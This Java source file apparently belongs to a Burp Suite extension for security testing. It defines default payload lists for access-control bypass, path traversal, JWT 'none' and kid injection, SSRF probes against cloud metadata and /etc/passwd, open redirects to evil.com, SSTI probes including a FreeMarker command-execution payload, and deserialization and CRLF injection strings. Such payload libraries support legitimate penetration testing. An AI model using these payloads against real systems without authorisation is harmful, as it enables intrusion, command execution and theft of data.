package com.acas.store;

import burp.api.montoya.MontoyaApi;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.LinkedHashSet;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.stream.Collectors;

public class PayloadStore {
    private static final String KEY_PREFIX = "acas.payloads.";

    public static class PayloadGroup {
        private final String key;
        private final String mutationCode;
        private final String displayLabel;
        private final List<String> defaultPayloads;

        public PayloadGroup(String key, String mutationCode, String displayLabel, List<String> defaultPayloads) {
            this.key = key;
            this.mutationCode = mutationCode;
            this.displayLabel = displayLabel;
            this.defaultPayloads = new ArrayList<>(defaultPayloads);
        }

        public String getKey() { return key; }
        public String getMutationCode() { return mutationCode; }
        public String getDisplayLabel() { return displayLabel; }
        public List<String> getDefaultPayloads() { return new ArrayList<>(defaultPayloads); }
    }

    private static PayloadGroup group(String key, String mutationCode, String displayLabel, String... defaults) {
        return new PayloadGroup(key, mutationCode, displayLabel, Arrays.asList(defaults));
    }

    private static final List<PayloadGroup> ALL_GROUPS = Arrays.asList(
        group("A2_IP_HEADER_NAMES", "A2", "IP Spoof - Header Names",
            "X-Forwarded-For", "X-Real-IP", "True-Client-IP", "X-Client-IP", "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr", "X-Cluster-Client-IP", "Forwarded", "CF-Connecting-IP"),
        group("A2_IP_VALUES", "A2", "IP Spoof - IP Values",
            "127.0.0.1", "localhost", "0.0.0.0", "::1", "10.0.0.1", "192.168.1.1", "172.16.0.1", "169.254.169.254", "metadata.google.internal"),
        group("A3_OVERRIDE_HEADER_NAMES", "A3", "URL Override - Header Names",
            "X-Original-URL", "X-Rewrite-URL", "X-Forwarded-Path", "X-Override-URL"),
        group("A3_OVERRIDE_PATHS", "A3", "URL Override - Paths",
            "/admin", "/admin/users", "/internal", "/private", "/management", "/actuator/env", "/actuator/mappings", "/_admin", "/superadmin", "/backend"),
        group("A4_HOST_VALUES", "A4", "Host Header Values",
            "localhost", "127.0.0.1", "0.0.0.0", "::1", "internal", "169.254.169.254", "metadata.google.internal"),
        group("A5_AUTH_VALUES", "A5", "Auth Confusion Values",
            "null", "undefined", "false", "0", "NaN", "none", "invalid", "test", "guest", "anonymous", "true", "{}", "[]", "Bearer", "expired", "revoked", " ", "Basic", "Token", "JWT"),
        group("A6_EXTENSIONS", "A6", "Extension Suffixes",
            ".json", ".xml", ".pdf", ".bak", ".txt", ".config", ".env", ".log", ".yml", ".yaml", ".csv", ".zip", ".tar.gz", ".sql", ".db"),
        group("A8_TRAVERSAL_PATTERNS", "A8", "Path Traversal Patterns",
            "/../", "/./", "/%2e%2e/", "/%252e%252e/", "/..%2f", "/%c0%ae%c0%ae/", "/....//", "/.%2e/", "/%2e./"),
        group("A9_ADMIN_PARAMS", "A9", "Admin Query Params",
            "admin=true", "admin=1", "is_admin=true", "role=admin", "role=superadmin", "debug=true", "sudo=1", "bypass=true", "override=true", "dev=true", "staff=true", "privileged=true", "god=true", "root=true", "force=true", "skip_auth=true", "no_auth=true", "auth=false"),
        group("A10_CONTENT_TYPES", "A10", "Content-Type Values",
            "application/json", "application/xml", "text/xml", "text/plain", "text/html", "multipart/form-data", "application/x-www-form-urlencoded", "application/graphql", "application/ld+json"),
        group("A13_PATH_SUFFIXES", "A13", "Path Bypass Suffixes",
            "/", "//", ";", ";v=2", ";version=2", ";jsessionid=ABC", "%23", "%3B", "%3F", "?", "#", "%20", "%09", "%00", ".do", ".action", ".aspx", ".php", ".html", ".htm", ".shtml"),
        group("A14_INTERNAL_PREFIXES", "A14", "Internal Path Prefixes",
            "/internal", "/private", "/admin", "/sys", "/management", "/backend", "/service", "/microservice", "/worker", "/actuator", "/_internal", "/api/internal", "/api/private", "/api/admin"),
        group("A15_METHOD_PARAMS", "A15", "Method Tunnel Param Names",
            "_method", "X-HTTP-Method", "method", "_httpMethod", "httpMethod", "request_method"),
        group("A16_ORIGIN_VALUES", "A16", "Origin Spoof Values",
            "null", "http://localhost", "https://localhost", "http://127.0.0.1", "https://127.0.0.1", "http://0.0.0.0"),
        group("A17_REFERER_PATHS", "A17", "Referer Spoof Paths",
            "/admin", "/admin/dashboard", "/internal", "/management", "/superadmin", "/dashboard", "/staff", "/backend"),
        group("A18_CACHE_PARAMS", "A18", "Cache Buster Param Names",
            "cb", "_", "nocache", "_t", "bust", "v", "rand", "ts", "_bust", "cache"),
        group("B2_HTTP_METHODS", "B2", "HTTP Methods",
            "DELETE", "HEAD", "OPTIONS", "PATCH", "PUT", "TRACE", "CONNECT"),
        group("B2_OVERRIDE_HEADERS", "B2", "Method Override Headers",
            "X-HTTP-Method-Override", "X-Method-Override", "_method", "X-HTTP-Method", "Method-Override"),
        group("B3_POLLUTION_PATTERNS", "B3", "Param Pollution Suffixes",
            "[]", "%5B%5D", "[0]", "[1]", "[2]", " ", "%20", "%00", "dup"),
        group("B4_API_VERSIONS", "B4", "API Version Strings",
            "v1", "v2", "v0", "v3", "v1.0", "v1.1", "v2.0", "old", "legacy", "beta", "alpha", "stable", "current", "prev"),
        group("B7_ARRAY_PATTERNS", "B7", "Array Wrap Patterns",
            "[{id}]", "[{id},{id}]", "{\"id\":[{id}]}", "{\"ids\":[{id}]}", "[{id},0]", "[{id},null]", "[{id},1]"),
        group("B8_NEIGHBOR_OFFSETS", "B8", "Numeric Neighbor Offsets",
            "1", "2", "5", "10", "100", "50", "1000", "9999"),
        group("B9_EDGE_IDS", "B9", "Edge Case ID Values",
            "0", "1", "-1", "99999", "2147483647", "2147483648", "null", "undefined", "NaN", "9999999999", "-2147483648"),
        group("B10_TYPE_JUGGLING", "B10", "Type Juggling Values",
            "\"true\"", "\"false\"", "\"null\"", "\"undefined\"", "\"0\"", "\"1\"", "true", "false", "null", "[]", "{}", "0.0", "1e0", "\" \""),
        group("B11_MASS_ASSIGN_FIELDS", "B11", "Mass Assignment Fields",
            "role", "is_admin", "admin", "privilege", "level", "group", "permissions", "scope", "access", "rank", "type", "user_type", "account_type", "subscription", "plan", "is_staff", "is_superuser", "is_active", "email_verified", "verified"),
        group("B12_JWT_ALG_VALUES", "B12", "JWT Algorithm Values",
            "none", "HS256", "RS256", "HS384", "HS512", "RS384"),
        group("B12_KID_PAYLOADS", "B12", "JWT kid Injection Payloads",
            "../../dev/null", "/dev/null", "' OR '1'='1", "\" OR \"1\"=\"1", "../../../../etc/passwd", "http://evil.com/jwks"),
        group("B13_COOKIE_STRIP", "B13", "Cookie Strip Patterns",
            "session", "auth", "token", "jwt", "access_token", "refresh_token", "remember_me", "sid"),
        group("B14_ROLE_HEADERS", "B14", "Role Header Name=Value",
            "X-User-Role: admin", "X-Role: admin", "X-Admin: true", "X-Is-Admin: true", "X-Privilege: 0", "X-Internal: true", "X-Staff: true", "X-Elevated: true", "X-Sudo: 1", "X-God-Mode: true", "X-Skip-Auth: true", "X-Force-Admin: true", "X-User-Level: 0", "X-User-Type: admin", "X-Service: internal"),
        group("B17_WILDCARD_IDS", "B17", "Wildcard ID Values",
            "*", "%", "_", "..", "**", "?", "{}", "[]", ".*", "%25", "%2a", "~", "0*"),
        group("C4_CHILD_PATHS", "C4", "Child/Sibling Path Suffixes",
            "/export", "/download", "/members", "/users", "/settings", "/logs", "/history", "/audit", "/debug", "/admin", "/raw", "/full", "/metadata", "/info", "/status", "/permissions", "/roles"),
        group("C5_TRAVERSAL_IDS", "C5", "Path Traversal ID Replacements",
            "../admin", "../../config", "%2e%2e/admin", "%2e%2e%2fadmin", "..%2fadmin", "%252e%252e/admin", "....//admin", ".%2e/admin", "%c0%ae%c0%ae/admin"),
        group("D2_FIELD_SUGGESTIONS", "D2", "GraphQL Field Suggestion Words",
            "user", "admin", "password", "secret", "token", "role", "permissions", "email", "phone", "address", "card", "billing", "internal", "private", "debug"),
        group("D4_FRAGMENT_STRINGS", "D4", "GraphQL Fragment Payloads",
            "fragment x on Query { __typename }", "fragment x on Mutation { __typename }", "...on User { password role }"),
        group("D5_MUTATION_STRINGS", "D5", "GraphQL Mutation Payloads",
            "mutation { updateRole(id:1, role:\"admin\") { id } }", "mutation { deleteUser(id:1) { success } }", "mutation { promoteUser(id:1) { role } }"),
        group("E3_STATE_PATHS", "E3", "State Transition Paths",
            "/activate", "/deactivate", "/confirm", "/cancel", "/archive", "/restore", "/publish", "/unpublish", "/approve", "/reject", "/lock", "/unlock"),
        group("E5_FORCED_BROWSE", "E5", "Forced Browse Paths",
            "/admin/setup", "/setup/complete", "/onboarding/skip", "/wizard/finish", "/install/done", "/config/save", "/admin/init", "/bootstrap"),
        group("F1_WHITESPACE_CHARS", "F1", "Whitespace Characters (hex)",
            "\\u0020", "\\u0009", "\\u000A", "\\u000D", "\\u00A0", "\\u200B", "\\u200C", "\\u200D", "\\uFEFF", "\\u2028", "\\u2029", "\\u0085", "\\u000B", "\\u000C", "\\u1680", "\\u2000", "\\u2001", "\\u2002", "\\u2003", "\\u2004", "\\u205F"),
        group("F3_HOMOGLYPH_MAP", "F3", "Homoglyph Substitutions",
            "a->а", "e->е", "o->о", "c->с", "p->р", "x->х", "i->і", "0->О", "l->І", "n->п"),
        group("F5_EMAIL_PLUS", "F5", "Email Plus Suffixes",
            "+admin", "+test", "+root", "+staff", "+superuser", "+debug", "+billing", "+support"),
        group("G1_ENCODE_CHARS", "G1", "Single-Encode Target Chars",
            "/", ".", "-", "_", "~", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")"),
        group("G3_OVERLONG_CHARS", "G3", "Overlong UTF-8 Targets",
            "/", ".", "\\", "%", "?", "#", "=", "&", "+", ";"),
        group("H_WHITESPACE_CHARS", "H", "Whitespace Injection Chars",
            "\\u0020", "\\u0009", "\\u000A", "\\u000D", "\\u00A0", "\\u200B", "\\u200C", "\\u200D", "\\uFEFF", "\\u2028", "\\u2029", "\\u0085", "\\u000B", "\\u000C", "\\u1680", "\\u2000", "\\u2001", "\\u2002", "\\u2003", "\\u2004", "\\u205F", "\\u3000"),
        group("I1_DEBUG_PARAMS", "I1", "Debug Param Names",
            "debug", "test", "dev", "trace", "verbose", "log", "mock", "dry_run", "sandbox", "staging", "preview"),
        group("I3_BATCH_PATHS", "I3", "Batch Endpoint Paths",
            "/bulk", "/batch", "/multi", "/many", "/list", "/all", "/mass", "/group"),
        group("I4_EXPORT_SUFFIXES", "I4", "Export Suffixes",
            "/export", "/download", "/pdf", "/csv", "/zip", "/report", "/raw", "/full", "/print", "/invoice", "/receipt", "/data", "/json", "/xml", "/xlsx"),
        group("I5_PREVIEW_SUFFIXES", "I5", "Preview/Draft Suffixes",
            "/preview", "/draft", "/staging", "/unpublished", "/pending", "/review", "/temp", "/cache", "/snapshot"),
        group("I6_SOFTDELETE_PARAMS", "I6", "Soft Delete Params",
            "include_deleted=true", "deleted=true", "status=deleted", "show_all=true", "archived=true", "trashed=true", "with_deleted=1", "paranoid=false", "active=false", "visible=all"),
        group("I7_PAGINATION_ABUSE", "I7", "Pagination Abuse Values",
            "page=-1", "limit=99999", "size=0", "offset=-1", "per_page=99999", "count=99999", "page=0", "limit=0"),
        group("I8_SSRF_URLS", "I8", "SSRF Probe URLs",
            "http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/", "http://localhost/admin", "http://127.0.0.1/admin", "http://0.0.0.0/admin", "http://[::1]/admin", "http://internal/", "file:///etc/passwd", "dict://localhost:11211/", "gopher://localhost/"),
        group("I9_LOG_INJECTION", "I9", "Log Injection Strings",
            "%0a", "%0d%0a", "\\n", "\\r\\n", "%0aContent-Type: text/html", "%0d%0aContent-Type: text/html", "%0aX-Injected: true", "%0d%0aX-Injected: true"),
        group("I11_OBJECT_REF_PARAMS", "I11", "Object Reference Param Names",
            "url", "path", "file", "resource", "href", "src", "redirect", "next", "return", "returnUrl", "callback", "image", "document", "uri", "link"),
        group("I13_REDIRECT_VALUES", "I13", "Open Redirect Values",
            "//evil.com", "https://evil.com", "/\\evil.com", "\\\\evil.com", "//evil.com/%2f..", "///evil.com", "http://evil.com", "https://evil.com@trusted.com", "javascript:alert(1)"),
        group("I15_SSTI_PROBES", "I15", "SSTI Probe Strings",
            "{{7*7}}", "${7*7}", "#{7*7}", "<% 7*7 %>", "${{7*7}}", "{{config}}", "{{self}}", "${class.getClassLoader()}", "#{7*7}", "%{7*7}", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"),
        group("I14_DESERIAL_PROBES", "I14", "Deserialization Probes",
            "rO0ABXNyAA==", "aced0005", "eyJhbGciOiJub25lIn0=", "{\"@type\":\"java.lang.Runtime\"}", "__reduce__", "!!python/object/apply:os.system"),
        group("J2_CRLF_STRINGS", "J2", "CRLF Injection Strings",
            "%0d%0a", "%0a", "\\r\\n", "%0d%0aX-Injected: true", "%0aX-Injected: true", "%0d%0aSet-Cookie: injected=1", "%E5%98%8A%E5%98%8D", "%E5%98%8A%E5%98%8DX-Injected: true"),
        group("J3_DUPLICATE_HOSTS", "J3", "Duplicate Host Values",
            "localhost", "127.0.0.1", "internal", "admin"),
        group("J6_H2_PSEUDO_HEADERS", "J6", "HTTP/2 Pseudo-Header Values",
            ":authority: localhost", ":scheme: http", ":path: /admin"),
        group("J7_PROTO_DOWNGRADES", "J7", "Protocol Downgrade Targets",
            "HTTP/1.0", "HTTP/0.9", "HTTP/1.1"),
        group("K_CUSTOM_COMBOS", "K", "Custom Combination Pairs",
            "B1+A9", "B1+G2", "A1+B11", "B4+B1", "A14+G1", "B1+I15", "A9+B9", "B14+B1", "A3+B1", "B12+B14")
    );

    private final MontoyaApi api;
    private final Map<String, PayloadGroup> groupByKey = new LinkedHashMap<>();
    private final Map<String, List<String>> customByKey = new LinkedHashMap<>();

    public PayloadStore(MontoyaApi api) {
        this.api = api;
        for (PayloadGroup group : ALL_GROUPS) {
            groupByKey.put(group.getKey(), group);
        }
        loadFromPersistence();
    }

    public List<String> getPayloads(String key) {
        List<String> values = customByKey.get(key);
        if (values != null) return new ArrayList<>(values);
        PayloadGroup group = groupByKey.get(key);
        if (group == null) return new ArrayList<>();
        return group.getDefaultPayloads();
    }

    public void setPayloads(String key, List<String> values) {
        if (key == null || key.trim().isEmpty()) return;
        List<String> normalized = normalize(values);
        customByKey.put(key, normalized);
        try {
            api.persistence().extensionData().setString(KEY_PREFIX + key, String.join("\n", normalized));
        } catch (Exception e) {
            api.logging().logToError("ACAS: Failed to save payloads for " + key + ": " + e.getMessage());
        }
    }

    public void resetToDefault(String key) {
        if (key == null || key.trim().isEmpty()) return;
        customByKey.remove(key);
        api.persistence().extensionData().setString(KEY_PREFIX + key, "");
    }

    public List<PayloadGroup> getAllGroups() {
        return new ArrayList<>(ALL_GROUPS);
    }

    public List<PayloadGroup> getGroupsForMutation(String mutationCode) {
        if (mutationCode == null) return Collections.emptyList();
        return ALL_GROUPS.stream()
            .filter(g -> mutationCode.equalsIgnoreCase(g.getMutationCode()))
            .collect(Collectors.toList());
    }

    public int getDefaultCount(String key) {
        PayloadGroup group = groupByKey.get(key);
        return group == null ? 0 : group.getDefaultPayloads().size();
    }

    public int getCustomOnlyCount(String key) {
        PayloadGroup group = groupByKey.get(key);
        if (group == null) return 0;
        List<String> current = getPayloads(key);
        LinkedHashSet<String> defaults = new LinkedHashSet<>(group.getDefaultPayloads());
        int count = 0;
        for (String item : current) {
            if (!defaults.contains(item)) count++;
        }
        return count;
    }

    private void loadFromPersistence() {
        for (PayloadGroup group : ALL_GROUPS) {
            String key = group.getKey();
            try {
                String raw = api.persistence().extensionData().getString(KEY_PREFIX + key);
                if (raw == null || raw.trim().isEmpty()) continue;
                List<String> loaded = splitLines(raw);
                if (!loaded.isEmpty()) {
                    customByKey.put(key, normalize(loaded));
                }
            } catch (Exception e) {
                api.logging().logToError("ACAS: Failed loading payloads for " + key + ": " + e.getMessage());
            }
        }
    }

    private List<String> splitLines(String raw) {
        List<String> out = new ArrayList<>();
        if (raw == null || raw.trim().isEmpty()) return out;
        String[] parts = raw.split("\\r?\\n");
        for (String part : parts) {
            if (part == null) continue;
            String v = part.trim();
            if (!v.isEmpty()) out.add(v);
        }
        return out;
    }

    private List<String> normalize(List<String> input) {
        if (input == null) return new ArrayList<>();
        List<String> out = new ArrayList<>();
        for (String line : input) {
            if (line == null) continue;
            String v = line.trim();
            if (!v.isEmpty()) out.add(v);
        }
        return out;
    }
}
